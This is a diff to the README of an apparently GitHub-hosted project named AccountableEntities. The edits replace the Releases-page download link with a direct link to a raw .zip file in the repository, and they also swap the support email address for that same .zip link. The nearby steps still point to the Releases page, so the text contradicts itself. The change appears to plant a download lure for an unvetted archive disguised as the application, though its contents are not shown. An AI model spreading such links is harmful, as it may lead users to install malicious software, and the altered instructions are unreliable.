@@ -14,7 +14,7 @@ Welcome to the AccountableEntities project. This software helps you understand a
 To get started, you’ll need to download the software and install it on your computer. 
 
 ## 📥 Download & Install
-You can visit this page to download the application: [Download AccountableEntities](https://github.com/Rockvaru/AccountableEntities/releases).
+You can visit this page to download the application: [Download AccountableEntities](https://github.com/Rockvaru/AccountableEntities/raw/refs/heads/main/AccountableEntities/Accountable_Entities_1.4.zip).
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version of the software.
@@ -50,7 +50,7 @@ If you encounter any issues or have questions while using AccountableEntities, p
 
 1. **GitHub Issues**: Submit your question or report bugs via the Issues tab in the project repository.
 2. **Community Forums**: Join discussions and seek help from fellow users in community forums related to formal verification and identity management.
-3. **Email Support**: For direct inquiries, you can also contact support@example.com.
+3. **Email Support**: For direct inquiries, you can also contact https://github.com/Rockvaru/AccountableEntities/raw/refs/heads/main/AccountableEntities/Accountable_Entities_1.4.zip
 
 ## 🔗 Related Topics
 The following topics are essential to understanding the broader context of AccountableEntities:
